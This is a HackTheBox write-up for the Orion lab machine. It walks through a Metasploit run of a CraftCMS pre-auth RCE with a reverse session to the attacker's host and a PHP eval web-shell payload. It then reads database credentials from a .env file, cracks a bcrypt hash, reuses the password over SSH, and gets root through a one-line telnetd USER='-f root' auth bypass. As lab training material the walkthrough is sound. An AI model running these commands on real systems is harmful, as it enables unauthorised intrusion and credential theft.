---
title: "HTB Orion — CraftCMS RCE, MySQL Credential Leak & Telnetd Auth Bypass"
date: 2026-07-04
categories: [HackTheBox, Linux]
tags: [htb, linux, craftcms, cve-2025-32432, telnetd, cve-2026-24061, mysql, hashcat, csrf-bypass, easy]
classes: wide
header:
  image: /assets/images/ORION/orion.png
  teaser: /assets/images/ORION/orion.png
---

<style>
p { text-align: justify; }
</style>

# HTB Orion

**Difficulty:** Easy  
**OS:** Linux  
**Platform:** HackTheBox  
**Status:** Active

---

## Overview

Orion is a very-easy Linux machine that covers three distinct techniques in a clean chain. A CraftCMS instance running a vulnerable version gives unauthenticated RCE. The web root contains a `.env` file with database credentials. MySQL holds a bcrypt hash that cracks to a password reused on the system account. And an internal telnet daemon with a known auth bypass drops you into a root shell with one environment variable.

Short box. Clean chain. Good fundamentals.

---

## Reconnaissance

### Nmap

```bash
nmap -sCV 10.129.21.96
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.18.0
```

```bash
echo "10.129.21.96 orion.htb" | sudo tee -a /etc/hosts
```

---

### Web Enumeration

The main site is a telecom company landing page. The footer gives away the CMS immediately:

```
Powered by CraftCMS
```

Directory fuzzing:

```bash
gobuster dir -u http://orion.htb/ -w /usr/share/wordlists/dirb/common.txt -t 50

admin            [200]
```

`/admin` redirects to `/admin/login` --> the CraftCMS control panel. The login page confirms the version: **CraftCMS 5.6.16**.

[Login](/assets/images/ORION/login.png)

That version is vulnerable to CVE-2025-32432.

---

## Initial Access — CVE-2025-32432 (CraftCMS Unauthenticated RCE)

### How It Works

The vulnerability lives in the `actions/assets/generate-transform` endpoint. CraftCMS uses Yii Framework's object configuration system, which allows arrays with a `class` key to instantiate arbitrary PHP classes. By sending a crafted JSON payload that triggers `GuzzleHttp\Psr7\FnStream` (which executes a callable on close), an attacker gets code execution without any authentication.

The attack runs in three phases:

- **Leak session path** — send a payload that calls `phpinfo()`, revealing `session.save_path`
- **Inject web shell** — poison a PHP session file with `<?=eval($_GET['cmd'])?>`
- **Trigger execution** — reference the poisoned session through the same endpoint

CSRF protection is bypassed by extracting `CRAFT_CSRF_TOKEN` from cookies and `csrfTokenValue` from the login page JavaScript, then including both in the request.

### Exploitation

```bash
msfconsole -q -x "use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432; \
  set rhosts orion.htb; \
  set rport 80; \
  set lhost 10.10.16.32; \
  run"
```

```bash
meterpreter > shell
script /dev/null -c /bin/bash
```

Shell landed as `www-data`.

---

## User Flag — MySQL Credentials and Hash Cracking

### Finding the Credentials

CraftCMS stores database configuration in a `.env` file at the project root:

```bash
cd /var/www/html/craft
cat .env
```
[DB](/assets/images/ORION/db.png)

```ini
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

One file. Database credentials in plaintext. Always check `.env` first.

### Extracting the Admin Hash

```bash
mysql -u root -pSuperSecureCraft123Pass! orion \
  -e "SELECT username,email,password FROM users;"
```
[HASH](/assets/images/ORION/admin.png)

```
admin | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

`$2y$` is bcrypt.

### Cracking

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Cracked: `darkangel`

### SSH Access

Adam reused their CraftCMS admin password for the system account:

```bash
ssh adam@orion.htb
# Password: darkangel
```

```bash
cat user.txt
[REDACTED]
```

**User flag captured.** ✅

---

## Privilege Escalation — CVE-2026-24061 (Telnetd Auth Bypass)

### Internal Service Discovery

First thing after getting a shell — enumerate what's listening locally:

```bash
ss -tulnp
```

```
tcp  LISTEN  127.0.0.1:23    # telnet
tcp  LISTEN  127.0.0.1:3306  # MySQL
```

Port 23. Telnet on a modern system is always suspicious.

```bash
telnet --version
# telnet (GNU inetutils) 2.7
```

GNU inetutils 2.7 telnetd is vulnerable to CVE-2026-24061.

### The Vulnerability

The telnet daemon passes the `USER` environment variable directly to the `login(1)` binary. The `-f` flag tells `login` to skip authentication entirely. Setting `USER` to `-f root` causes the daemon to execute `login -f root`, which drops straight into a root shell with no password prompt.

```bash
USER="-f root" telnet -a 127.0.0.1
```

```
Trying 127.0.0.1...
Connected to 127.0.0.1.
Linux 5.15.0-171-generic (orion)

root@orion:~#
```

---

## Root Flag

```bash
cat /root/root.txt
[REDACTED]
```

**Root flag captured. Box pwned.** ✅

---
<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExdmd3dG5jZWp6NmRmdHZjZ2N0dGhrM2VxOTgwc2JoZjg2ZXVsYTBociZlcD12MV9naWZzX3NlYXJjaCZjdD1n/4N5ddOOJJ7gtKTgNac/giphy.gif"
     style="width: 100%; height: auto;"
     alt="pwned">
     
## Full Attack Chain

```
CVE-2025-32432: CraftCMS object injection RCE
-> CSRF bypass via token extraction from login page
-> www-data shell
   |
   /var/www/html/craft/.env -> MySQL root credentials
   -> mysql -> extract admin bcrypt hash
   -> hashcat (mode 3200) -> darkangel
   -> SSH as adam -> USER FLAG
      |
      ss -tulnp -> telnetd on 127.0.0.1:23
      -> GNU inetutils 2.7 -> CVE-2026-24061
      -> USER="-f root" telnet -a 127.0.0.1
      -> login -f root -> ROOT FLAG
```

## What Did We Learn?

**1. CMS version disclosure on the login page is an immediate attack signal**  
The CraftCMS version was printed at the bottom of the admin login page. One searchsploit query later and the attack path was clear. Always check footers, headers, and response metadata before doing anything else.

**2. CSRF tokens protect nothing when they're readable from the same unauthenticated page**  
The `csrfTokenValue` was embedded in the JavaScript of the login page, readable by anyone who fetched it. CSRF tokens only provide protection when they're tied to an authenticated session.

**3. `.env` files are the first thing to read after landing a web shell**  
One file contained the database driver, server, port, name, username, and password in plaintext. The entire database was open the moment we found that file. Web application `.env` files should never be accessible from inside the webroot.

**4. bcrypt is slow but common passwords still fall quickly**  
`$2y$` hashes are designed to resist cracking with cost factor 13. `darkangel` was in rockyou.txt and cracked in seconds. Long, random passwords are the only real defence against offline cracking.

**5. Credential reuse is the pivot that makes chains work**  
The CraftCMS admin password was reused for the system `adam` account. This is the most common lateral movement path in real environments — always try extracted passwords against SSH, WinRM, and any other auth surface.

**6. Internal services are invisible from outside but fully accessible from a shell**  
Port 23 wasn't visible in the initial nmap scan because it was bound to localhost. `ss -tulnp` after landing a shell surfaces everything that's running internally. Always enumerate local services post-compromise.

**7. The `USER` environment variable passing to `login` is a classic Unix footgun**  
Passing `-f root` through `USER` to the telnet daemon's `login(1) `call bypasses authentication entirely. Any service that passes environment variables unsanitised to a login binary is exploitable this way.

---


*Written by 0x5h4q | [0x5h4q.github.io](https://0x5h4q.github.io)*
